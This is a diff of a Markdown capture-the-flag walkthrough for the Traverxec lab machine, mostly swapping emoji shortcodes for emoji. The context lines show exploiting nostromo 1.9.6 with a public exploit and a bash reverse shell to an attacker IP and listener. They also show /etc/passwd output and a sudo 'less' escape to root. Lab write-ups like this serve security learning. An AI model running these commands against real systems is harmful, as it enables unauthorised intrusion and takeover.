@@ -111,7 +111,7 @@ The nmap scans show that the webserver is **nostromo 1.9.6**. Checked searchsplo
 
 ![searchsploit](searchsploit.png)
 
- ==> Yep there is an exploit! :clap: 
+ ==> Yep there is an exploit! 👏 
 
 I took a copy of the exploit. However, I had to modify the exploit very slightly: comment out one line. Change one string to `bytes(____,'utf-8')` encoding 
 
@@ -127,7 +127,7 @@ nc -lvnp 4444
 python3 ./47837.py 10.10.10.165 80 "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
 ```
 
-:tada: Got a reverse shell. 
+🎉 Got a reverse shell. 
 
 
 
@@ -140,10 +140,10 @@ In an effort to keep this walkthrough brief, I'll only discuss the notable resul
 - Important users are `www-data`, `david`, and `root`:
 
   ```
-  uid=33(www-data) gid=33(www-data) groups=33(www-data)
-  root:x:0:0:root:/root:/bin/bash
-  sync:x:4:65534:sync:/bin:/bin/sync
-  david:x:1000:1000:david,,,:/home/david:/bin/bash
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    root:x:0:0:root:/root:/bin/bash
+    sync:x:4:65534:sync:/bin:/bin/sync
+    david:x:1000:1000:david,,,:/home/david:/bin/bash
   ```
 
 - Lots of useful tools are already on the box:
@@ -172,7 +172,7 @@ In an effort to keep this walkthrough brief, I'll only discuss the notable resul
 
 Identified the hash using `hash-identifier`
 
-> :bulb: After writing this walkthrough, I discovered a wonderful new hash identification tool called Name-That-Hash. I highly recommend you go check it out.
+> 💡 After writing this walkthrough, I discovered a wonderful new hash identification tool called Name-That-Hash. I highly recommend you go check it out.
 
 ```
 hash-identifier
@@ -319,7 +319,7 @@ david@traverxec:~$ echo $PATH
 /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
 
-That's a bit odd. This could lead to path abuse possibly. I might come back to this later :triangular_flag_on_post:
+That's a bit odd. This could lead to path abuse possibly. I might come back to this later 🚩
 
 There are two files within: server-stats.head and server-stats.sh. This is server-stats.head:
 
@@ -337,7 +337,7 @@ There are two files within: server-stats.head and server-stats.sh. This is serve
 
 ```
 
-> Cute! :heart_eyes_cat: Love the ascii art
+> Cute! 😻 Love the ascii art
 >
 
 And here's server-stats.sh
@@ -369,7 +369,7 @@ Just run the `sudo` part of the final line by itself
 
 Make sure to shrink the window down to **fewer than 5 lines tall**. this way, `less` has to scroll, so the -n5 flag doesnt make it terminate immediately. If `less` doesnt terminate, you can run a shell through it! 
 
-I used it to spawn a **bash reverse shell** and baboom root access :tada:
+I used it to spawn a **bash reverse shell** and baboom root access 🎉
 
 
 
